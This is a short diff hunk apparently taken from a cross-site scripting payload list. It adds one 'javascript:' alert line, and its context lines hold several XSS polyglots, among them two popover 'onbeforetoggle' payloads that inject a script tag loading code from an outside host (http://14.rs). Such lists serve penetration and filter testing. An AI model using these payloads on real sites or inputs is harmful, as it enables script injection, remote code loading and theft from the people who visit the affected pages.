@@ -1734,3 +1734,4 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )
 <button style=”color:red” popovertarget=”x” value=”Click me”>Click Me</button><hvita onbeforetoggle=with(document){xx=createElement(‘script’);xx.setAttribute(‘src’,’http://14.rs');body.appendChild(xx)} popover id=x>Hvita</hvita>
 <button style="color:red" popovertarget="x" value="Click me">Click Me</button><hvita onbeforetoggle=with(document){xx=createElement('script');xx.setAttribute('src','http://14.rs');body.appendChild(xx)} popover id=x>Hvita</hvita>
 *//"><script>/*alert(1)//
+#javascript:alert(5397)
